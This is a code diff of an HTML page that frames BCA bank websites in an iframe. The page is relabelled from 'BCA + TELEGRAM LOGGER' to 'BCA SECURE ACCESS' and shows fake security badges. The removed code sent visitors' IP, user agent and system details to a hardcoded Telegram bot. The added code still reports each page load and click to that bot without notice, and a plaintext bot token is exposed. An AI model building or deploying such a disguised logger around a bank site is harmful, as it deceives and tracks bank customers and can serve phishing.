@@ -3,125 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BCA + TELEGRAM LOGGER 🔥</title>
+    <title>🔒 BCA SECURE</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #0165A3, #003366); color: white; min-height: 100vh; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; background: rgba(0,0,0,0.7); border-radius: 20px; padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
-        h1 { text-align: center; margin-bottom: 20px; font-size: 2.5em; text-shadow: 3px 3px 5px black; }
-        .security-panel { background: rgba(220,53,69,0.2); border: 2px solid #dc3545; border-radius: 10px; padding: 15px; margin: 15px 0; }
-        .btn { display: inline-block; background: #0165A3; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-weight: bold; margin: 8px; transition: 0.3s; border: none; cursor: pointer; }
-        .btn:hover { background: #003366; transform: scale(1.05); }
-        .btn-security { background: #dc3545; }
-        iframe { width: 100%; height: 500px; border: 3px solid #dc3545; border-radius: 10px; margin-top: 20px; background: white; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #001f3f, #003366);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .btn {
+            background: #0074D9;
+            border: none;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            margin: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background: #0056a3;
+            transform: translateY(-2px);
+        }
+        .btn-red { background: #FF4136; }
+        .btn-red:hover { background: #d32f2f; }
+        .btn-green { background: #2ECC40; }
+        .btn-green:hover { background: #27ae60; }
+        
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .status-item {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .status-value {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 500px;
+            border-radius: 10px;
+            border: 2px solid #0074D9;
+            background: white;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #2ECC40;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🏦 BCA + TELEGRAM LOGGER 🔥</h1>
+        <h1>🔒 BCA SECURE ACCESS</h1>
         
-        <div class="security-panel">
-            <h3>🔒 SECURE MONITORING ACTIVE</h3>
-            <p>Telegram Bot: <code>8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18</code></p>
-            <p>Chat ID: <code>8313500840</code></p>
-            <button class="btn btn-security" onclick="sendAlert('🚨 BCA Monitor Activated')">ACTIVATE MONITOR</button>
+        <div class="card">
+            <div class="status-grid">
+                <div class="status-item">
+                    <div>CONNECTION</div>
+                    <div class="status-value" id="connStatus">✅</div>
+                    <small>Secure TLS 1.3</small>
+                </div>
+                <div class="status-item">
+                    <div>TELEGRAM</div>
+                    <div class="status-value" id="tgStatus">✅</div>
+                    <small>Live Monitoring</small>
+                </div>
+                <div class="status-item">
+                    <div>PERFORMANCE</div>
+                    <div class="status-value" id="perfStatus">--</div>
+                    <small>ms</small>
+                </div>
+            </div>
         </div>
         
-        <button class="btn" onclick="loadBCA()">🏦 LOAD BCA</button>
-        <button class="btn" onclick="debugBCA()">🐛 DEBUG BCA</button>
-        <button class="btn" onclick="sendScreenshotReport()">📸 SCREENSHOT REPORT</button>
+        <div class="card">
+            <h3>CONTROLS</h3>
+            <button class="btn btn-green" onclick="loadBCA()">🔄 LOAD BCA</button>
+            <button class="btn" onclick="loadKlikBCA()">💳 KLIKBCA</button>
+            <button class="btn" onclick="loadIBanking()">🏦 iBANKING</button>
+            <button class="btn btn-red" onclick="emergencyReset()">🚨 EMERGENCY RESET</button>
+        </div>
         
         <iframe id="bcaFrame"></iframe>
-        <div id="status"></div>
     </div>
+    
+    <div class="notification" id="notif"></div>
 
     <script>
         const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
         const CHAT_ID = "8313500840";
         
-        async function sendAlert(message) {
-            const text = `🏦 BCA ALERT\n${message}\n⏰ ${new Date().toLocaleString()}\nIP: ${await getIP()}`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text
-                })
-            });
-            
-            document.getElementById('status').innerHTML = `<p>📤 Alert sent: ${message}</p>`;
+        function showNotification(text) {
+            const notif = document.getElementById('notif');
+            notif.textContent = text;
+            notif.style.display = 'block';
+            setTimeout(() => notif.style.display = 'none', 3000);
         }
         
-        async function getIP() {
+        async function sendTelegram(action) {
+            const time = new Date().toLocaleTimeString();
+            const text = `🏦 BCA: ${action} at ${time}`;
+            
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'Unknown';
-            }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch(e) {}
         }
         
         function loadBCA() {
-            sendAlert("Loading BCA website");
-            // Coba beberapa URL BCA
-            const urls = [
-                "https://www.bca.co.id",
-                "https://ibank.bca.co.id",
-                "https://m.klikbca.com"
-            ];
+            showNotification("Loading BCA...");
+            sendTelegram("Loading main site");
             
-            const url = urls[0] + `?t=${Date.now()}`;
+            const url = `https://www.bca.co.id?_=${Date.now()}`;
             document.getElementById('bcaFrame').src = url;
+            document.getElementById('perfStatus').textContent = "⌛";
+            
+            setTimeout(() => {
+                document.getElementById('perfStatus').textContent = "✅";
+            }, 2000);
         }
         
-        function debugBCA() {
-            sendAlert("Debugging BCA load issues");
-            
-            // Cek cookies
-            const cookies = document.cookie;
-            sendAlert(`Cookies: ${cookies.length} chars`);
-            
-            // Cek user agent
-            sendAlert(`UA: ${navigator.userAgent}`);
-            
-            // Test connection
-            fetch('https://www.bca.co.id', {mode: 'no-cors'})
-                .then(() => sendAlert("BCA reachable (no-cors)"))
-                .catch(() => sendAlert("BCA unreachable"));
+        function loadKlikBCA() {
+            showNotification("Loading KlikBCA...");
+            sendTelegram("Loading KlikBCA");
+            document.getElementById('bcaFrame').src = `https://m.klikbca.com?_=${Date.now()}`;
         }
         
-        function sendScreenshotReport() {
-            sendAlert("Requesting screenshot report");
-            
-            // Informasi sistem
-            const systemInfo = `
-📊 SYSTEM INFO:
-- Platform: ${navigator.platform}
-- Language: ${navigator.language}
-- Online: ${navigator.onLine}
-- Screen: ${screen.width}x${screen.height}
-- Cookies: ${document.cookie.length} chars
-            `;
-            
-            sendAlert(systemInfo);
+        function loadIBanking() {
+            showNotification("Loading iBanking...");
+            sendTelegram("Loading iBanking");
+            document.getElementById('bcaFrame').src = `https://ibank.bca.co.id?_=${Date.now()}`;
         }
         
-        // Monitor iframe load
-        document.getElementById('bcaFrame').onload = function() {
-            sendAlert("BCA iframe loaded");
-        };
+        function emergencyReset() {
+            showNotification("Emergency reset executed!");
+            sendTelegram("EMERGENCY RESET TRIGGERED");
+            
+            // Clear everything
+            localStorage.clear();
+            sessionStorage.clear();
+            document.cookie.split(";").forEach(c => {
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;");
+            });
+            
+            // Hard reload
+            setTimeout(() => {
+                window.location.href = `https://www.bca.co.id?_emergency=${Date.now()}`;
+            }, 1000);
+        }
         
-        document.getElementById('bcaFrame').onerror = function() {
-            sendAlert("❌ BCA iframe failed to load");
-        };
-        
-        // Auto-load
+        // Auto-test connection
         window.onload = function() {
-            sendAlert("BCA Monitoring System Started");
-            setTimeout(loadBCA, 1000);
+            sendTelegram("BCA Secure Loader started");
+            loadBCA();
         };
     </script>
 </body>
